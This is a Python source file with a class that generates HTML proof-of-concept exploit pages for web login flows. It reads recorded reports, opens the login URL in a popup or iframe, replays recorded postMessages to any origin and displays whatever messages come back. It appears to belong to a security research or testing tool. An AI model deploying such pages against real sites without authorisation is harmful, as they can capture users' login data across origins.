import json

class PoCGenerator:

    def __init__(self, ctx):
        self.ctx = ctx

    def generate_poc(self):
        """ Generate PoC exploits as HTML code.
            Returns:
                - (True, String), if exploit generation was successfull
                - (False, String), if exploit generation was not successfull
        """

        if "flow" not in self.ctx.statements:
            return (False, "Could not determine flow type (redirect, popup, iframe)")

        if "loginreqframe" not in self.ctx.statements:
            return (False, "Could not determine the frame containing the login request")

        if "loginrequrl" not in self.ctx.statements:
            return (False, "Could not determine the login request")

        loginreqframe_first_url = self.get_first_url_of_frame(self.ctx.statements["loginreqframe"])
        if loginreqframe_first_url is None:
            return (False, "Could not determine the first URL of the frame containing the login request")

        loginreqframe_postmessages = self.get_postmessages_data_sent_to_frame(self.ctx.statements["loginreqframe"])

        poc_html = self.poc_template(self.ctx.statements, loginreqframe_first_url, loginreqframe_postmessages)
        return (True, poc_html)

    def get_first_url_of_frame(self, frame):
        """ Get the URL first loaded into a frame.
            Returns:
                - String, if the first URL of the frame could be determined
                - None, if the first URL of the frame could not be determined
        """
        for report in self.ctx.reports:
            if report["key"] == "documentinit":
                hierarchy = report["val"]["hierarchy"]
                if frame == hierarchy:
                    return report["val"]["href"]
        return None

    def get_postmessages_data_sent_to_frame(self, frame):
        """ Get the postmessages data sent to a frame.
            Returns:
                - List of postmessages with their corresponding data
        """
        postmessages = []
        for report in self.ctx.reports:
            if report["key"] == "postmessagereceived" and report["val"]["target_frame"] == frame:
                postmessage_data = report["val"]["data"]
                postmessage_data_type = report["val"]["data_type"]
                if postmessage_data_type == "string":
                    postmessages.append(f'"{postmessage_data}"')
                else:
                    postmessages.append(f"{postmessage_data}")
        return postmessages

    @staticmethod
    def poc_template(statements, embed_url, postmessages):

        title = statements.get("initurl", "N/A")
        statements_string = json.dumps(statements, indent=4)

        postmessages_popup_string = ""
        for postmessage in postmessages:
            postmessages_popup_string += f"        popup.postMessage({postmessage}, '*')\n"

        postmessages_iframe_string = ""
        for postmessage in postmessages:
            postmessages_iframe_string += f"        frame.postMessage({postmessage}, '*')\n"

        poc_template = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC: {title}</title>
</head>
<body>
  <h1>PoC: {title}</h1>
  <p><button onclick="openPopup()">Open Popup</button></p>
  <p><button onclick="embedIframe()">Embed IFrame</button></p>

  <h3>Statements</h3>
  <code><pre>{statements_string}</pre></code>

  <h3>Received postMessages:</h3>
  <div id="pms"></div>

  <script>
    window.onmessage = (e) => {{
      let p = document.createElement('p')
      p.textContent = `Received postMessage from ${{e.origin}} with data of type ${{typeof e.data}}: ${{JSON.stringify(e.data)}}`
      document.querySelector('#pms').appendChild(p)
    }}

    function openPopup() {{
      popup = window.open('{embed_url}', '_blank')
      setTimeout(() => {{
{postmessages_popup_string}
      }}, 3000) // wait for popup to load
    }}

    function embedIframe() {{
      frame = document.createElement('iframe')
      frame.src = '{embed_url}'
      frame.onload = () => {{
{postmessages_iframe_string}
      }}
      document.body.appendChild(frame)
    }}
  </script>
</body>
</html>
        """
        return poc_template
